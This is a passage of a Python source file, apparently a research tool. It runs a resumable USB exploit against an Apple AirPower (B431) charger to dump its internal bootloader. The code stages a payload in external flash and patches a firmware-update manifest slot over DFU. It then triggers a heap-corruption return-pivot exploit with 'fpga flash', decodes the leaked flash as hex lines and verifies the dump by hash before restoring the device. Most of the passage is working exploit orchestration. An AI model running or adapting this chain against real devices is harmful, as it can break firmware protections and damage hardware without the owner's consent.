                f"spi_flash write_byte 0x{erase_address:08x} 0xff",
                timeout=SHORT_COMMAND_TIMEOUT,
                label=f"preflight_erase_staging_{index:04d}",
            )
            erased_label = f"preflight_erased_staging_{index:04d}"
            erased = read_console_sector(console, address, erased_label)
            if erased != b"\xff" * SECTOR_SIZE:
                raise RuntimeError(f"staging sector {index} did not erase")
            run.log("Erased stale external-flash staging sector", sector=index)

    if not exact:
        bus, ports = enter_dfu(console)
        dfu_write(
            run,
            helper,
            STAGING_DFU_BASE,
            staging_path,
            bus,
            ports,
            "stage_payload",
        )
        console = open_console(run)

    for index, expected in enumerate(sectors):
        address = STAGING_CONSOLE_BASE + index * SECTOR_SIZE
        label = f"verify_image_sector_{index:04d}"
        actual = read_console_sector(console, address, label)
        if actual != expected:
            raise RuntimeError(f"staged payload sector {index} mismatch")

    run.log(
        "Verified every staged exploit sector byte-for-byte",
        sectors=len(sectors),
        sha256=sha256(staging),
    )
    run.event("payload_staged_verified", sha256=sha256(staging))
    return console


def erase_and_seed_manifest(
    console: Console,
    erase_label: str,
    seed_label: str,
) -> None:
    """Erase the manifest sector and prepare its B431 status byte for DfuSe."""
    # Offset 0x110 is an inert byte inside the manifest sector. Writing 0xff
    # there erases all 4 KiB without touching the status byte that must be seeded
    # next. Directly programming byte 3 to 0x7f prepares the sector for DfuSe's
    # nonstandard first-word behavior before a complete sector is written.
    console.command(
        f"spi_flash write_byte 0x{MANIFEST_ERASE_PROBE_OFFSET:08x} 0xff",
        timeout=SHORT_COMMAND_TIMEOUT,
        label=erase_label,
    )
    console.command(
        f"spi_flash write_byte 0x{MANIFEST_STATUS_BYTE:08x} 0x7f",
        timeout=SHORT_COMMAND_TIMEOUT,
        label=seed_label,
    )


def manifest_seed() -> bytes:
    """Return the expected sparse manifest between sector erase and DFU write."""
    seed = bytearray(b"\xff" * SECTOR_SIZE)
    seed[MANIFEST_STATUS_BYTE] = 0x7F
    return bytes(seed)


def apply_manifest_patch(run: Run, console: Console, helper: Path, original: bytes) -> Console:
    """Temporarily point firmware-update slot 3 at the staged image."""
    patched = patch_manifest(original)
    patched_path = run.write_artifact(
        "patched-manifest.bin",
        patched,
        "patched manifest with slot 3 pointing at the exploit",
    )
    # Set this durable flag before erasing. If the process dies mid-patch, a
    # resumed cleanup knows it must restore the saved manifest.
    run.state["manifest_modify_started"] = True
    run.save_state()
    erase_and_seed_manifest(console, "erase_manifest", "seed_manifest")
    seeded = read_manifest(console, "seeded_manifest")
    expected_seed = manifest_seed()
    if seeded != expected_seed:
        raise RuntimeError(f"manifest erase/seed state mismatch: {seeded[:16].hex()}")
    # The seeded manifest is deliberately sparse at this point.  Only after the
    # complete 4 KiB DFU write can slot 3 be considered patched.
    bus, ports = enter_dfu(console)
    dfu_write(
        run,
        helper,
        MANIFEST_DFU_BASE,
        patched_path,
        bus,
        ports,
        "patch_manifest",
    )
    console = open_console(run)
    current = read_manifest(console, "verify_patched_manifest")
    run.write_artifact(
        "actual-patched-manifest.bin",
        current,
        "manifest readback after slot-3 patch",
    )
    actual_slot = current[MANIFEST_SLOT_OFFSET : MANIFEST_SLOT_OFFSET + 8]
    expected_slot = patched[MANIFEST_SLOT_OFFSET : MANIFEST_SLOT_OFFSET + 8]
    if actual_slot != expected_slot:
        raise RuntimeError(f"manifest slot 3 was not patched: {actual_slot.hex()}")
    run.state["manifest_patched"] = True
    run.save_state()
    run.log("Verified patched manifest slot 3", slot_address=f"0x{MANIFEST_SLOT_OFFSET:x}")
    return console


def trigger_and_decode(run: Run, console: Console) -> tuple[bool, bytes]:
    """Trigger the exploit once, decode its output, and compare it."""
    # `fpga flash` asks the application to consume the slot-3 Apple-wrapped VME
    # image.  In the accepted payload, its heap-oracle layout overwrites a saved
    # row-writer return address, pivots to a naked Thumb handler, reads internal
    # flash 0x08000000..0x08007fff, emits one 64-character hex line per 32 bytes,
    # and flushes each line through the firmware USB output path.
    response = console.command(
        "fpga flash",
        timeout=EXPLOIT_TIMEOUT,
        label="fpga_flash_exploit",
        stop_on=BOOT_END,
    )
    run.write_artifact(
        "fpga-flash-response.bin",
        response,
        "complete framed exploit response",
    )
    # Record the trigger before decoding. A later resume must clean up rather
    # than blindly execute the heap exploit a second time.
    run.state["exploit_triggered"] = True
    run.save_state()
    recovered, lines = decode_boot_dump(response)
    output = run.bootloader_path
    atomic_write(output, recovered)
    run.announce_bootloader(output)
    digest = sha256(recovered)
    matches = digest == BOOT_SHA256
    result = {
        "output": str(output),
        "size": len(recovered),
        "sha256": digest,
        "expected_sha256": BOOT_SHA256,
        "hex_lines": len(lines),
        "end_marker_seen": BOOT_END in response,
        "sha256_match": matches,
        "verification_method": "expected-sha256",
    }
    run.write_json_artifact("result.json", result, "dump verification result")
    run.state["dump_verified"] = bool(matches)
    run.save_state()
    run.log(
        "Verified recovered bootloader against the expected SHA-256",
        size=len(recovered),
        hex_lines=len(lines),
        sha256=digest,
        sha256_match=matches,
    )
    run.event("dump_result", **result)
    return matches, recovered


def restore_manifest(run: Run, console: Console, helper: Path, original: bytes) -> Console:
    """Restore the exact saved manifest through the DFU path."""
    restore = bytearray(original)
    # DfuSe may alter the first status word; 0x7f is the accepted restored
    # state for this manifest and matches the tested original image.
    restore[3] = 0x7F
    restore_path = run.write_artifact(
        "restore-manifest.bin",
        bytes(restore),
        "original manifest prepared for cleanup restore",
    )
    # Restore uses the same erase-and-seed prologue as the exploit patch, then
    # replaces the complete sector with the exact saved original manifest.
    erase_and_seed_manifest(
        console,
        "cleanup_erase_manifest",
        "cleanup_seed_manifest",
    )
    seeded = read_manifest(console, "cleanup_seeded_manifest")
    if seeded != manifest_seed():
        raise RuntimeError("cleanup manifest erase/seed state mismatch")
    bus, ports = enter_dfu(console)
    dfu_write(run, helper, MANIFEST_DFU_BASE, restore_path, bus, ports, "restore_manifest")
    console = open_console(run)
    restored = read_manifest(console, "cleanup_restored_manifest")
    if restored != bytes(restore):
        raise RuntimeError(
            "manifest was not restored byte-for-byte: "
            f"diff_count={sum(a != b for a, b in zip(restored, restore))}"
        )
    run.log("Restored the original manifest byte-for-byte")
    return console


def erase_staging(run: Run, console: Console) -> None:
    """Erase and verify every sector reserved for payload staging."""
    # Erase the complete historical staging window, not only the three sectors
    # used by this payload, so no earlier test image can remain selectable.
    for sector in range(STAGING_WINDOW_SECTORS):
        address = STAGING_FLASH_OFFSET + sector * SECTOR_SIZE
        external = STAGING_CONSOLE_BASE + sector * SECTOR_SIZE
        before = read_console_sector(console, external, f"cleanup_before_erase_{sector}")
        if before == b"\xff" * SECTOR_SIZE:
            continue
        console.command(
            f"spi_flash write_byte 0x{address:08x} 0xff",
            timeout=SHORT_COMMAND_TIMEOUT,
            label=f"cleanup_erase_staging_{sector}",
        )
        after = read_console_sector(console, external, f"cleanup_after_erase_{sector}")
        if after != b"\xff" * SECTOR_SIZE:
            raise RuntimeError(f"cleanup staging sector {sector} did not erase")
        run.log("Erased and verified staging sector during cleanup", sector=sector)


def cleanup(run: Run, console: Optional[Console], helper: Path, original: bytes) -> Console:
    """Restore the console path, manifest, staging area, and FPGA state."""
    run.log("Starting post-exploit cleanup and device-state verification")
    try:
        if console is None:
            console = open_console(run, timeout=10)
        else:
            console.ensure_prompt(8)
    except Exception as error:
        run.event("cleanup_console_retry", error=repr(error))
        if console is not None:
            console.close()
        console = open_console_after_manual_power_cycle(
            run,
            "exploit handler left console without a prompt",
        )

    # A crash between erase and final state update still requires restore;
    # therefore cleanup keys off attempted modification, not just success.
    if run.state.get("manifest_patched") or run.state.get("manifest_modify_started"):
        console = restore_manifest(run, console, helper, original)
        run.state["manifest_patched"] = False
        run.state["manifest_modify_started"] = False
        run.save_state()
    erase_staging(run, console)
    fpga_version(console, "cleanup_fpga_ver")
    run.state["cleanup_completed"] = True
    run.state["phase"] = "cleanup_completed"
    run.save_state()
    run.log("Cleanup complete; manifest restored, staging erased, FPGA verified")
    run.event("cleanup_complete")
    return console


def create_run(arguments: argparse.Namespace) -> Run:
    """Create a fresh run or reopen the run selected by --resume."""
    if arguments.resume is not None:
        return Run(arguments.resume, resume=True)

    stamp = dt.datetime.now().strftime("%Y%m%d-%H%M%S")
    return Run(arguments.runs / stamp, resume=False)


def reused_completed_run(run: Run) -> bool:
    """Return true when an already-clean run has a verified dump result."""
    if not run.state.get("cleanup_completed"):
        return False

    if not run.result_path.is_file() or not run.state.get("dump_verified"):
        raise RuntimeError("state claims cleanup completed but verified dump is absent")

    result = json.loads(run.result_path.read_text())
    if result.get("sha256") != BOOT_SHA256 or not result.get(
        "sha256_match", result.get("byte_for_byte_match", False)
    ):
        raise RuntimeError("completed run does not contain the expected bootloader hash")

    run.log(
        "Reusing the already-completed and hash-verified dump result",
    )
    run.event("test_finished", success=True, reused_state=True)
    return True


def load_original_manifest(run: Run, console: Console) -> bytes:
    """Load saved manifest evidence or capture it before any mutation."""
    original_path = run.artifacts / "original-manifest.bin"
    if original_path.is_file():
        original = original_path.read_bytes()
        if len(original) != SECTOR_SIZE:
            raise RuntimeError("saved original manifest has the wrong size")
        run.log(
            "Loaded the previously saved original manifest",
            sha256=sha256(original),
        )
    else:
        original = read_manifest(console, "preflight_manifest")
        run.write_artifact(
            "original-manifest.bin",
            original,
            "original manifest saved before any mutation",
        )

    run.event("original_manifest_saved", sha256=sha256(original))
    return original


def trigger_or_reuse_result(run: Run, console: Console) -> bool:
    """Trigger once or reuse an already-recorded dump result."""
    # exploit_triggered is a one-way latch. There is no safe retry path after
    # the parser has consumed the corrupted VME heap image.
    if not run.state.get("exploit_triggered"):
        success, _ = trigger_and_decode(run, console)
        return success

    if not run.result_path.is_file():
        raise RuntimeError(
            "state says exploit ran, but result.json is absent; refusing to resend it"
        )

    result = json.loads(run.result_path.read_text())
    success = result.get("sha256") == BOOT_SHA256 and bool(
        result.get("sha256_match", result.get("byte_for_byte_match", False))
    )
    if not success:
        raise RuntimeError("previous exploit response did not verify")
    run.log(
        "Reusing the already-recorded hash-verified exploit dump result",
        sha256_match=success,
    )
    return success


def console_after_exploit(run: Run) -> Console:
    """Recover the console after the final handler parks with its magic stored."""
    # The accepted final handler prints the dump and then parks after its magic
    # store. Power-cycling the AirPower restores the application console.
    try:
        return open_console(run, timeout=15)
    except Exception as error:
        run.log(
            "Console did not return immediately after the exploit; requesting restart",
            error=repr(error),
        )
        run.event("post_exploit_console_retry", error=repr(error))
        return open_console_after_manual_power_cycle(
            run,
            "return-pivot handler finished",
        )


def hardware_run(arguments: argparse.Namespace) -> int:
    """Coordinate one resumable exploit, dump, restart, and cleanup run."""
    run = create_run(arguments)
    run.log(
        "Starting USB-only B431 Apple bootloader dump exploit",
    )
    run.event("run_started", expected_sha256=BOOT_SHA256, payload=str(PAYLOAD))
    run.save_state()
    helper = compile_dfu_helper(run)

    console: Optional[Console] = None
    original: Optional[bytes] = None
    try:
        if reused_completed_run(run):
            run.print_final_locations()
            return 0

        # Preflight establishes the factory FPGA state and saves the manifest
        # that will be authoritative for cleanup even if the exploit hangs.
        run.log("Beginning preflight checks and original-manifest capture")
        console = open_console(run)
        fpga_version(console, "preflight_fpga_ver")
        original = load_original_manifest(run, console)

        run.log("Staging the Apple-wrapped VME exploit in external flash")
        console = stage_payload(run, console, helper)
        run.phase("payload_staged")

        if not run.state.get("manifest_patched"):
            run.log("Patching firmware-update manifest slot 3")
            console = apply_manifest_patch(run, console, helper, original)
        run.phase("manifest_patched")

        run.log("Triggering the return-pivot exploit with fpga flash")
        success = trigger_or_reuse_result(run, console)
        run.phase("dump_decoded")

        console.close()
        console = None
        console = console_after_exploit(run)

        console = cleanup(run, console, helper, original)
        console.close()
        console = None

        run.log(
            "AirPower Apple bootloader dump exploit finished",
            success=success,
        )
        run.event("test_finished", success=success, cleanup_completed=True)
        run.print_final_locations()
        return 0 if success else 1
    except Exception as error:
        run.log("Run failed; beginning safe cleanup and state preservation", error=repr(error))
        run.event("run_failed", error=repr(error))

        # Best-effort cleanup must not mask the original failure. If cleanup
        # also fails, preserve state and tell the operator how to resume it.
        try:
            if original is not None:
                console = cleanup(run, console, helper, original)
        except Exception as cleanup_error:
            run.event(
                "cleanup_failed",
                error=repr(cleanup_error),
                resume_command=f"python3 {Path(__file__).name} --resume {run.out}",
            )

        print(
            f"FAILED: {error}; resume with: python3 {Path(__file__).name} --resume {run.out}",
            file=sys.stderr,
        )
        return 1
    finally:
        if console is not None:
            console.close()
        run.close()


def parse_arguments(argv: Optional[list[str]] = None) -> argparse.Namespace:
    """Parse offline and live-hardware invocation modes."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--resume", type=Path, help="resume an interrupted run directory")
    parser.add_argument("--runs", type=Path, default=ROOT / "runs", help="output parent")
    parser.add_argument("--dry-run", action="store_true", help="verify assets only")
    parser.add_argument("--self-test", action="store_true", help="run offline decoder/patch tests")
    arguments = parser.parse_args(argv)
    if arguments.resume and arguments.self_test:
        parser.error("--self-test cannot be combined with --resume")
    return arguments


def main(argv: Optional[list[str]] = None) -> int:
    """Dispatch self-test, asset-only, or live-hardware operation."""
    arguments = parse_arguments(argv)
    if arguments.self_test:
        run_self_tests()
        print("self-test: PASS")
        return 0

    # Validate immutable exploit input before opening the device or modifying flash.
    verify_payload()

    if arguments.dry_run:
        print(
            json.dumps(
                {
                    "payload": {"size": PAYLOAD_SIZE, "sha256": PAYLOAD_SHA256},
                    "expected_bootloader": {
                        "size": BOOT_SIZE,
                        "sha256": BOOT_SHA256,
                    },
                    "usb_only": True,
                },
                indent=2,
            )
        )
        return 0

    if sys.platform != "darwin":
        print("this runner currently requires macOS USB/serial APIs", file=sys.stderr)
        return 1

    return hardware_run(arguments)


if __name__ == "__main__":
    raise SystemExit(main())
